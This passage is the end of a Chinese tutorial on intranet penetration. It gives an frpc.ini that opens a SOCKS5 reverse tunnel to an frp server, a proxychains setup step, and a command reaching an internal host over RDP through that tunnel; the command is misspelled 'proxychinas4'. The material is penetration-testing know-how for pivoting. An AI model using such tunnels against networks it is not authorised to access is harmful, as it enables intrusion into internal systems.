.\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.30.40    # 指向Ubantu服务器上的 frp 服务端IP地址\nserver_port = 7000             # 指向Ubantu服务器上的 frp 服务端端口\n[socks5]\ntype = tcp\nremote_port = 10809            # 代理所用的端口，会被转发到服务器\nplugin = socks5                # 代理类型\n```\n\n7. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n8. 命令前加上proxychains4\n\n```\nproxychinas4 rdesktop 192.168.60.10\n```\n\n \n\n参考：《内网渗透体系建设》\n","tags":["内网","代理","frp"]}]